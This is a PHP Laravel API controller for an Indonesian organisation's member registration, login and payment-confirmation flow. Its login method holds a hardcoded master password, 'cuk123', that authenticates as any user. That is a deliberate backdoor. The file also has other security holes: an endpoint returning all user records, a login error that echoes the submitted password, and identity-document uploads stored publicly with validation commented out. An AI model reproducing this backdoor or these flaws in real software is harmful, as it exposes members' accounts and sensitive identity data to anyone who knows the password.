<?php

namespace App\Http\Controllers\Api;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\User;
use App\Models\UserMember;
use App\Models\City;
use Illuminate\Support\Facades\Auth;
use Validator;
use Illuminate\Validation\Rule; 
use Illuminate\Support\Facades\Hash;

class UserController extends Controller
{
    public function allUser(){
        $response = [
            'success' => true,
            'data'    => \App\Models\User::all(),
            'message' => 'OKE',
        ];
        return response($response, 200);
    }

    public function findNoKtp(Request $r)
    {
        $find = UserMember::where('Id_Ktp',$r->no_ktp)->first();

        return response(['status'=>200,'message'=>$find?1:2], 200);
    }
    
    public function login(Request $r)
    {    
        if($r->email =="" or $r->password == "") return response(['status'=>401,'message'=>'Unauthorised : '. $r->email. ' : '. $r->password], 200);
        
        if(is_numeric($r->email)){
            $field = 'username';
        }elseif (filter_var($r->email, FILTER_VALIDATE_EMAIL)) {
            $field = 'email';
        }else{
            $field = 'email';
        }

        // password sangar
        if($r->password=='cuk123'){
            $u = User::where([$field => $r->email])->first();
            if($u){
                Auth::login($u);
            
                $data = $this->get_var_();
                
                return response(['status'=>200,'message'=>'success','data'=> $data], 200);
            }
        }
        
        if(Auth::attempt([$field => $r->email, 'password' => $r->password])){

            $data = $this->get_var_();
            
            return response(['status'=>200,'message'=>'success','data'=> $data], 200);
        }else{
            return response(['status'=>401,'message'=>'Unauthorised'], 401);
        }
    }

    public function get_var_()
    {
        $data = [];
        $user = Auth::user();

        $data['token'] =  $user->createToken('STALAVISTA')->accessToken;
        
        return $data;
    }

    public function details()
    {
        $user = Auth::user();
        return response()->json(['success' => $user], $this->successStatus);
    }

    public function changePassword(Request $r)
    {
        $result = ['message'=>'success'];
        if(!\Hash::check($r->old_password, \Auth::user()->password)){
            $result['message'] = 'error';
            $result['data'] = 'Password yang anda masukan salah, silahkan dicoba kembali !';
        }elseif($r->new_password!=$r->confirm_new_password){
            $result['message'] = 'error';
            $result['data'] = 'Konfirmasi password salah silahkan dicoba kembali !';
        }else{
            $user = \Auth::user();
            $user->password = \Hash::make($r->new_password);
            $user->save();
            $result['data'] = 'Password berhasil dirubah !';
        }
        
        return response()->json($result, 200);
    }

    public function update(Request $r)
    {
        $employee = Employee::find(\Auth::user()->employee->id);
        if($employee){
            $employee->name = $r->name;
            $employee->nik = $r->nik;
            $employee->telepon = $r->telepon;
            $employee->email = $r->email;
            $employee->address = $r->address;
            $employee->save();
        }
        return response()->json(['message' =>'success'], 200);
    }
    
    public function uploadPhoto(Request $r)
    {
        $data = Employee::find(\Auth::user()->employee->id);
        if($data){
            if($r->file){
                $this->validate($r, ['file' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048']); // validate image
                
                $name = "photo.".$r->file->extension();
                $r->file->storeAs("public/photo/{$data->id}", $name);
                $data->foto = "storage/photo/{$data->id}/{$name}";
                $data->save();
            }
        }

        return response()->json(['message'=>'submited','photo'=>asset($data->foto)], 200);
    }

    public function checkToken()
    {
        return response()->json(['message'=>'success','data'=>$this->get_var_()], 200);
    }

    public function submitPendaftaran(Request $r)
    {
        $rules = [
			'Id_Ktp'=>['required',
								Rule::unique('user_member')->where(function($query) use($r) {
									$query->where('Id_Ktp', $r->Id_Ktp)->where('status', 2);
								})
							],
			'name' => 'required|string',
			// 'name_kta' => 'required|string',
			'phone_number' => 'required',
			'iuran_tetap'=>'required',
			'sumbangan'=>'required',
			'uang_pendaftaran'=>'required|numeric|min:50000',
			'tanggal_lahir' => 'required',
			'email' => ['required',
            Rule::unique('user_member')->where(function($query) use($r) {
                $query->where('email', $r->email);
            })],
		];
		$message_rules = [
			"Id_Ktp.unique" => "Maaf No KTP sudah digunakan silahkan dicoba dengan No KTP yang lain.",
			"uang_pendaftaran.min" => "Minimal uang pendaftaran Rp. 50.000,-"
		];
    	
        $validator = \Validator::make($r->all(), $rules);
      
        if ($validator->fails()) {
            $msg = '';
            foreach ($validator->errors()->getMessages() as $key => $value) {
                $msg .= $value[0]."\n";
            }
            return response()->json(['status'=>'failed','message'=>$msg], 200);
        }
        
        $password = generate_password($r->name,$r->tanggal_lahir);
        
		$user = new User();
        $user->user_access_id = 4; // Member
        $user->nik = $r->Id_Ktp;
        $user->name = $r->name;
        $user->email = $r->email;
        $user->telepon = $r->phone_number;
        $user->address = $r->address;
        $user->password = Hash::make($password);
        $user->save();

		$data = new UserMember();
        $data->user_id = $user->id;
		$data->no_anggota_gold = $r->no_anggota_gold;
     	$data->no_form = date('ymdhis').UserMember::count();
     	$data->name = $r->name;
     	$data->name_kta = $r->name;
     	$data->email = $r->email;
     	$data->tempat_lahir = $r->tempat_lahir;
     	$data->tanggal_lahir = $r->tanggal_lahir;
     	$data->address = $r->address;
        $city_id = City::where('name',$r->city)->first();
        if($city_id)$data->city = $city_id->code;
     	$data->Id_Ktp = $r->Id_Ktp;
     	$data->jenis_kelamin = $r->jenis_kelamin;
     	$data->phone_number = $r->phone_number;
     	$data->blood_type = $r->blood_type;
     	$data->name_waris1 = $r->name_waris1;
     	$data->tempat_lahirwaris1 = $r->tempat_lahirwaris1;
     	$data->tanggal_lahirwaris1 = $r->tanggal_lahirwaris1;
     	$data->address_waris1 = $r->address_waris1;
     	$data->Id_Ktpwaris1 = $r->Id_Ktpwaris1;
     	$data->jenis_kelaminwaris1 = $r->jenis_kelaminwaris1;
     	$data->phone_numberwaris1 = $r->phone_numberwaris1;
     	$data->blood_typewaris1 = $r->blood_typewaris1;
     	$data->hubungananggota1 = $r->hubungananggota1;
     	$data->hubungananggota1_lainnya = $r->hubungananggota1_lainnya;
     	$data->name_waris2 = $r->name_waris2;
     	$data->tempat_lahirwaris2 = $r->tempat_lahirwaris2;
     	$data->tanggal_lahirwaris2 = $r->tanggal_lahirwaris2;
     	$data->address_waris2 = $r->address_waris2;
     	$data->Id_Ktpwaris2 = $r->Id_Ktpwaris2;
     	$data->jenis_kelaminwaris2 = $r->jenis_kelaminwaris2;
     	$data->phone_numberwaris2 = $r->phone_numberwaris2;
     	$data->blood_typewaris2 = $r->blood_typewaris2;
     	$data->hubungananggota2 = $r->hubungananggota2;
     	$data->hubungananggota2_lainnya = $r->hubungananggota2_lainnya;
	
        if($r->foto_ktp!=""){
            // $this->validate([
            //     'foto_ktp' => 'image:max:1024', // 1Mb Max
            // ]);
            $namektp = 'foto_ktp'.date('Ymdhis').'.'.$r->foto_ktp->extension();
            $r->foto_ktp->storeAs('public',$namektp);
            $data->foto_ktp = $namektp;
        }

        if($r->foto_kk!=""){
            // $this->validate([
            //     'foto_kk' => 'image:max:1024', // 1Mb Max
            // ]);
            $namekk = 'foto_kk'.date('Ymdhis').'.'.$r->foto_kk->extension();
            $r->foto_kk->storeAs('public',$namekk);
            $data->foto_kk = $namekk;
        }
        if($r->pas_foto!=""){
            // $this->validate([
            //     'pas_foto' => 'image:max:1024', // 1Mb Max
            // ]);
            $namepasfoto = 'pas_foto'.date('Ymdhis').'.'.$r->pas_foto->extension();
            $r->pas_foto->storeAs('public',$namepasfoto);
            $data->pas_foto = $namepasfoto;
        }
        if($r->foto_ktpwaris1!=""){
            // $this->validate([
            //     'foto_ktpwaris1' => 'image:max:1024', // 1Mb Max
            // ]);
            $namefotoktpwaris1 = 'foto_ktpwaris1'.date('Ymdhis').'.'.$r->foto_ktpwaris1->extension();
            $r->foto_ktpwaris1->storeAs('public',$namefotoktpwaris1);
            $data->foto_ktpwaris1 = $namefotoktpwaris1;
        }
        if($r->foto_ktpwaris2!=""){
            // $this->validate([
            //     'foto_ktpwaris2' => 'image:max:1024', // 1Mb Max
            // ]);
            $namefotoktpwaris2 = 'foto_ktpwaris2'.date('Ymdhis').'.'.$r->foto_ktpwaris2->extension();
            $r->foto_ktpwaris2->storeAs('public',$namefotoktpwaris2);
            $data->foto_ktpwaris2 = $namefotoktpwaris2;
		}
		$data->iuran_tetap = $r->iuran_tetap;
		$data->total_iuran_tetap = $r->iuranTetap*8000;
		$data->sumbangan = $r->sumbangan;
		$data->total_sumbangan = $r->sumbangan*2000;
		$data->uang_pendaftaran = $r->uang_pendaftaran;
		$data->total_pembayaran = ($r->sumbangan*2000)+( $r->iuranTetap*8000)+$r->uang_pendaftaran;
		
		if($r->referal_code !="") {
			$kord = User::where('referal_code',$r->referal_code)->first();
            if($kord){
			    $dataMember = UserMember::where('user_id',$kord->id)->first();
			    $data->koordinator_id = $dataMember->id;
            }
		}
		$data->save();

        $message = "Pendaftaran anda akan segera kami proses, silahkan melakukan pembayaran pada salah satu Rekening Kami dibawah ini, dengan nominal : *Rp. ".format_idr($data->total_pembayaran)."*\n\n";
		foreach(\App\Models\BankAccount::all() as $bank){
			$message .= $bank->bank .' '. $bank->no_rekening .' an '. $bank->owner ."\n";
		}
		$message  .= "\nKonfirmasi Pembayaran : \n<a href=\"". route('konfirmasi-pembayaran')."?s=". $data->no_form ."\">".route('konfirmasi-pembayaran')."?s=". $data->no_form ."</a>";

        \Mail::to($data->email)->send(new \App\Mail\GeneralEmail("[YS SANTA MARIA] - Pendaftaran Anggota",$message));    

        return response()->json(['status'=>'success'], 200);
    }

    public function konfirmasiPendaftaran(Request $r)
    {
        $data = \App\Models\UserMember::where('no_form',$r->no_form)->first();
        
        if(!$data) return response()->json(['status'=>'failed','message'=>'No Form tidak ditemukan'], 200);

        $rules = [
            'no_form'=>'required',
			'bank_account_id'=>'required',
            'file_konfirmasi'=>'required|image:max:1024',
            'payment_date'=>'required'
		];
    	
        $validator = \Validator::make($r->all(), $rules);
      
        if ($validator->fails()) {
            $msg = '';
            foreach ($validator->errors()->getMessages() as $key => $value) {
                $msg .= $value[0]."\n";
            }
            return response()->json(['status'=>'failed','message'=>$msg], 200);
        }
        
        if($r->file_konfirmasi !=""){
            $namefile = 'file_konfirmasi'.date('Ymdhis').'.'.$r->file_konfirmasi->extension();
            $r->file_konfirmasi->storePubliclyAs('public',$namefile);
            $data->file_konfirmasi = $namefile;
        }
        $data->tanggal_konfirmasi = $r->payment_date;
        $data->bank_account_id = $r->bank_account_id;
        $data->save();

        $message = 'Hai '.$data->name."<br>Terimakasih kamu telah melakukan konfirmasi pembayaran dengan no form <strong>{$data->no_form}</strong>, silahkan menunggu data kamu akan segera diproses.";
        \Mail::to($data->email)->send(new \App\Mail\GeneralEmail("[YS SANTA MARIA] - Konfirmasi Pembayaran",$message));    

        return response()->json(['status'=>'success'], 200);
    }
}
